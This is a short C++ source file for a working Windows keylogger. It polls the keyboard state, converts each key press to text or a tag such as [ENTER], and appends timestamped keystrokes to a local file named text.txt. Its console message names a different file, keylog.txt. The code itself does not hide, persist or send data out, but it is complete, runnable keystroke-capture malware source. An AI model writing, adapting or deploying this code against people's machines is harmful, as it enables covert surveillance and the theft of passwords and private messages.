#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <ctime>

// Function to get current timestamp
std::string getTimeStamp() {
    time_t now = time(0);
    struct tm* timeinfo;
    char buffer[80];
    timeinfo = localtime(&now);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", timeinfo);
    return std::string(buffer);
}

// Function to convert virtual key code to string representation
std::string keyCodeToString(int key) {
    std::string result;
    
    // Check for special keys
    switch (key) {
        case VK_SPACE: result = "[SPACE]"; break;
        case VK_RETURN: result = "[ENTER]\n"; break;
        case VK_BACK: result = "[BACKSPACE]"; break;
        case VK_TAB: result = "[TAB]"; break;
        case VK_SHIFT: result = "[SHIFT]"; break;
        case VK_CONTROL: result = "[CTRL]"; break;
        case VK_MENU: result = "[ALT]"; break;
        case VK_ESCAPE: result = "[ESC]"; break;
        case VK_LEFT: result = "[LEFT]"; break;
        case VK_RIGHT: result = "[RIGHT]"; break;
        case VK_UP: result = "[UP]"; break;
        case VK_DOWN: result = "[DOWN]"; break;
        case VK_DELETE: result = "[DEL]"; break;
        default:
            // Handle regular keys
            BYTE keyState[256] = {0};
            WORD character = 0;
            // Get the keyboard state
            GetKeyboardState(keyState);
            // Convert virtual key to character
            if (ToAscii(key, MapVirtualKey(key, 0), keyState, &character, 0) == 1) {
                result = char(character);
            } else {
                result = "[KEY:" + std::to_string(key) + "]";
            }
    }
    return result;
}

int main() {
    // Open log file
    std::ofstream logFile("text.txt", std::ios::app);
    // hayden cho checking to see if this works
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file!" << std::endl;
        return 1;
    }
    
    // Write header to log file
    logFile << "\n--- Keylogger started at " << getTimeStamp() << " ---\n";
    logFile.flush();
    
    // Console output
    std::cout << "Keylogger started. Press Ctrl+C to exit.\n";
    std::cout << "Logging to keylog.txt in the current directory.\n";
    
    // Main loop to capture keystrokes
    while (true) {
        // Check all virtual keys
        for (int key = 8; key <= 190; key++) {
            // Check if key is pressed
            if (GetAsyncKeyState(key) & 0x0001) {
                std::string keyStr = keyCodeToString(key);
                
                // Write to log file
                logFile << keyStr;
                logFile.flush();
                
                // Optional: Sleep to reduce CPU usage
                Sleep(10);
            }
        }
    }
    
    return 0;
}